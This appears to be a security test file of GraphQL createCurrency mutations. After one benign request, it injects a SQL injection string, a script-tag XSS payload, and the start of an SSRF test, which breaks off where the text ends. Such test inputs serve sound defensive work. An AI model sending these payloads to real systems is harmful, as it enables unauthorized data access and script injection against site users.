query.query:
mutation {
  createCurrency(input: {
    abbreviation: "USD",
    symbol: "$",
    country: "United States"
  }) {
    id
    abbreviation
    symbol
    rate
    country
  }
}

mutation {
  createCurrency(input: {
    abbreviation: "USD' OR 1=1--",
    symbol: "-",
    country: "United States"
  }) {
    id
    abbreviation
  }
}

mutation {
  createCurrency(input: {
    abbreviation: "XSS",
    symbol: "X",
    country: "<script>alert(document.domain)</script>"
  }) {
    country
  }
}

mutation {
  createCurrency(input: {
    abbreviation: "SSRF",
